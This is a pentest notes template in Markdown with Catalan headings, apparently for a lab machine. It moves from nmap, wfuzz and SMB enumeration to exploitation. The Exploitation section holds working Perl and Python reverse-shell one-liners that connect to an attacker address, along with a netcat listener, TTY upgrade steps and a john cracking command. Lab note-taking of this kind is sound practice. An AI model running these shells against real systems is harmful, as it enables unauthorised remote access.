# Recon

```bash
ping -c 1 10.10.10.94
```

```bash
nmap -p- --open -T5 -v -n 10.10.10.94
```

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.94 -oG allPorts 
extractPorts allPorts
nmap -sCV -p1880 10.10.10.94 -oN targeted

#UDP
nmap -sU --top-ports 200 10.10.10.94
```

# Enumeration

## Services

### TCP

Web:

```bash
whatweb http://10.10.10.94:1880
whatweb https://10.10.10.94:1880
```

```bash
nmap --script http-enum -p1880 10.10.10.94 -oN webScan
```

Certificat SSL (domini o alguna cosa interessant):

```bash
openssl s_client -connect 10.10.10.154:443
```

Fuzzing amb WFuzz:

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.94/FUZZ
```

SMB:

```bash
crackmapexec smb 10.10.10.94
smbclient -L 10.10.10.94 -N
smbmap -H 10.10.10.94 -u 'null'
```

### UDP

NA

# Exploitation

Escolta per la reverse shell:

```bash
nc -nlvp 443
```

Reverse shell en perl:

```bash
perl -e 'use Socket;$i="10.10.14.29";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Reverse shell en python:
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::101b",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

# Post Exploitation

Ajustar la TTY:

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

## System Information

## Installed Applications

## Running Processes

## Scheduled Jobs-Tasks

## Editable Service

## Network

## Users and Groups

## Files on the System

## System Exploitation

## Privilege Escalation

### Output from Privesc Scripts


# High Value Information

## Hashes

```bash
echo "root:*F435735A173757E57BD36B09048B8B610FF4D0C4" > credentials.txt
john --wordlist=/usr/shar/wordlists/rockyou.txt credentials.txt
```

## Passwords

```
root:toor
```

## Proof - Screenshots


---

# Notes

Fill in results or other information about your target here:

{{title}}
{{date:DD-MM:YYYY}} {{time}}